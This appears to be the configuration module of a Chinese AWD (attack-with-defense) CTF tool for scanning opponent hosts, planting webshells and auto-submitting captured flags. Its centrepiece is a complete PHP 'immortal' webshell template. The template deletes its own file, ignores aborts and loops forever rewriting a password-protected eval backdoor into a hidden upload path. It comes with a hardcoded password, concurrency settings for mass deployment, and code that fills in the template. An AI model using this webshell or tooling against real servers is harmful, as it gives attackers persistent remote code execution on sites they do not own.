# -*- coding: utf-8 -*-
"""
AWD 工具 - 全局配置
=========================
所有可在「设置」页修改的项都集中在这里，改动会自动保存到 settings.json，
下次启动自动读回。核心逻辑（core.py）直接引用这里的值。

v3.x 变更：
- 不死马模板里的 md5 / 参数名由 pass 密码自动生成，改 pass 不再需要手改 PHP；
- settings.json 原子写入（tmp + replace），写入失败返回 False；
- 增加任务并发、提交并发、轮次秒数、窗口尺寸等配置；
- 增加 state.json 读写，用于 flag 去重与断点续跑。

author : anglekat
"""

import hashlib
import json
import os

# ---------- 路径 ----------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
设置文件 = os.path.join(BASE_DIR, 'settings.json')
状态文件 = os.path.join(BASE_DIR, 'state.json')
IP文件 = os.path.join(BASE_DIR, 'ip.txt')
日志目录 = os.path.join(BASE_DIR, 'logs')

# ---------- 不死马 ----------
# 默认的不死马代码模板。占位符：
#   {文件名}  木马文件名（不含目录，写到首次落地文件所在目录 __DIR__）
#   {md5}     木马的pass密码的 md5
#   {参数}    木马执行命令的 POST 参数名
不死马代码模板 = """<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = __DIR__ . '/{文件名}';
$code = '<?php if((isset($_POST["pass"])&&md5($_POST["pass"])=="{md5}")||(isset($_GET["pass"])&&md5($_GET["pass"])=="{md5}")){@eval($_POST["{参数}"]);} ?>';
while (1){
    file_put_contents($file,$code);
    usleep(10000);
}
?>"""

# 不死马在目标机器上的绝对路径（写文件用）
不死马路径 = '/var/www/html/upload/.data.php'
# 不死马相对 web 根目录的路径（访问用）
运行的不死马路径 = 'upload/.data.php'
# 落地木马文件名（相对 web 根目录，目录要和 不死马路径 的目录一致）
木马文件名 = 'upload/-.php'

# 木马的 pass（md5 校验用，模板会自动生成对应的 md5）
木马的pass密码 = 'qwe123!@#poiqwezscascsa'
# 木马执行命令时 POST 的参数名
木马密码 = 'a'
# 入口写马/触发/验证时附加的请求头，格式：Key: Value | Key2: Value2
写入请求头 = ''

# ---------- 网络 ----------
请求超时 = 2.0        # 单次请求超时（秒）
扫描超时 = 1.0        # 扫描时探测单个 IP 的超时（秒）
并发数 = 50           # 扫描线程数
任务并发 = 8          # 写马 / 取 flag / 命令台的并发线程数
提交并发 = 3          # 提交 flag 的并发（平台通常有限流，别开大）
提交间隔 = 0.0        # 两次提交之间的最小间隔（秒，0 表示不限制）
轮次秒数 = 300        # 自动轮次间隔（秒）
目标端口 = '80'       # 扫描与写马使用的 web 端口，默认 80

# ---------- 运行 / 界面 ----------
成功关键字 = ''       # 提交 flag 后，响应里含该关键字则标记成功（留空则按 JSON/状态码判断）
全局去重 = False      # True 时同一个 flag 只提交一次（不同目标同 flag 视为重复）
提交协议 = 'auto'      # auto / http / https；auto 时按 Host 端口与 Origin/Referer 推断
主题 = 'light'        # light / dark
界面字号 = 13
窗口宽 = 1120
窗口高 = 760

# ---------- 运行时状态（由代码写入，不持久化到 settings.json） ----------
不死马代码 = ''
木马URL = ''
木马的执行方式 = ''
写入不死马木马的密码 = ''
木马的传参方式 = ''
木马协议 = 'http'
木马端口 = ''
count = 1

# ---------- 持久化 ----------
可保存项 = [
    '不死马路径', '运行的不死马路径', '木马文件名',
    '木马的pass密码', '木马密码', '写入请求头',
    '请求超时', '扫描超时', '并发数', '任务并发', '提交并发', '提交间隔',
    '轮次秒数', '目标端口',
    '成功关键字', '全局去重', '提交协议', '主题', '界面字号', '窗口宽', '窗口高',
]

_INT_KEYS = {'并发数', '任务并发', '提交并发', '轮次秒数', '界面字号', '窗口宽', '窗口高'}
_FLOAT_KEYS = {'请求超时', '扫描超时', '提交间隔'}
_BOOL_KEYS = {'全局去重'}

# 各数值项的合理范围，读写时统一收敛，避免 0/负数/超大值把程序搞崩
_RANGES = {
    '并发数': (1, 200),
    '任务并发': (1, 100),
    '提交并发': (1, 50),
    '提交间隔': (0.0, 5.0),
    '轮次秒数': (30, 3600),
    '界面字号': (11, 18),
    '窗口宽': (860, 10000),
    '窗口高': (540, 10000),
    '请求超时': (0.2, 60.0),
    '扫描超时': (0.1, 10.0),
}

_DEFAULTS = {key: globals()[key] for key in 可保存项}


def _coerce(key, value):
    """把设置值收敛到合法类型和范围，非法时返回默认值"""
    default = _DEFAULTS.get(key)
    if value is None:
        return default
    if key in _BOOL_KEYS:
        if isinstance(value, bool):
            return value
        if isinstance(value, (int, float)):
            return bool(value)
        return str(value).strip().lower() in ('1', 'true', 'yes', 'on')
    try:
        if key in _INT_KEYS:
            value = int(float(value))
        elif key in _FLOAT_KEYS:
            value = float(value)
        elif key == '目标端口':
            value = str(int(float(value)))
        elif key == '主题':
            value = 'dark' if str(value).strip().lower() == 'dark' else 'light'
        elif key == '提交协议':
            value = str(value).strip().lower()
            if value not in ('auto', 'http', 'https'):
                return default
        else:
            value = str(value)
    except (TypeError, ValueError):
        return default
    if key in _RANGES:
        low, high = _RANGES[key]
        if not (low <= value <= high):
            return default
    if key == '目标端口':
        try:
            port = int(value)
        except (TypeError, ValueError):
            return default
        if not (1 <= port <= 65535):
            return default
    return value


def ensure_dirs():
    """确保日志等目录存在"""
    try:
        os.makedirs(日志目录, exist_ok=True)
    except OSError:
        pass


def load_settings():
    """从 settings.json 读取用户设置，覆盖默认值；文件不存在/损坏返回 False"""
    if not os.path.exists(设置文件):
        return False
    try:
        with open(设置文件, 'r', encoding='utf-8') as f:
            data = json.load(f)
    except (OSError, ValueError):
        return False
    if not isinstance(data, dict):
        return False
    for key in 可保存项:
        if key in data:
            globals()[key] = _coerce(key, data[key])
    return True


def save_settings(values=None):
    """
    把可保存项原子写入 settings.json。
    先写临时文件再 replace；只有写成功后才更新内存，失败时内存保持原值。
    """
    new_values = {key: globals().get(key) for key in 可保存项}
    if values:
        for key, value in values.items():
            if key in 可保存项:
                new_values[key] = _coerce(key, value)
    tmp = 设置文件 + '.tmp'
    try:
        with open(tmp, 'w', encoding='utf-8') as f:
            json.dump(new_values, f, ensure_ascii=False, indent=2)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp, 设置文件)
    except OSError:
        try:
            if os.path.exists(tmp):
                os.remove(tmp)
        except OSError:
            pass
        return False
    for key in 可保存项:
        globals()[key] = new_values[key]
    return True


def reset_settings():
    """删除 settings.json（配合 restore_defaults() 使用）"""
    try:
        if os.path.exists(设置文件):
            os.remove(设置文件)
    except OSError:
        return False
    return True


def restore_defaults():
    """把内存中的可保存项恢复为默认值"""
    for key in 可保存项:
        globals()[key] = _DEFAULTS[key]


def load_state():
    """读取 state.json（flag 去重 / 断点续跑），失败返回空 dict"""
    if not os.path.exists(状态文件):
        return {}
    try:
        with open(状态文件, 'r', encoding='utf-8') as f:
            data = json.load(f)
    except (OSError, ValueError):
        return {}
    return data if isinstance(data, dict) else {}


def save_state(data):
    """原子写入 state.json"""
    if not isinstance(data, dict):
        return False
    tmp = 状态文件 + '.tmp'
    try:
        with open(tmp, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp, 状态文件)
    except OSError:
        try:
            if os.path.exists(tmp):
                os.remove(tmp)
        except OSError:
            pass
        return False
    return True


def _php_single(text):
    """转义要放进 PHP 单引号字符串里的文本"""
    return str(text).replace('\\', '\\\\').replace("'", "\\'")


def _php_double(text):
    """转义要放进 PHP 双引号字符串里的文本"""
    return str(text).replace('\\', '\\\\').replace('"', '\\"')


def busima_default():
    """按当前 木马文件名 / 木马密码 / pass 生成默认不死马代码"""
    md5 = hashlib.md5(str(木马的pass密码).encode('utf-8')).hexdigest()
    name = 木马文件名.split('/')[-1] or '-.php'
    param = 木马密码 or 'a'
    return (不死马代码模板
            .replace('{md5}', md5)
            .replace('{参数}', _php_double(param))
            .replace('{文件名}', _php_single(name)))
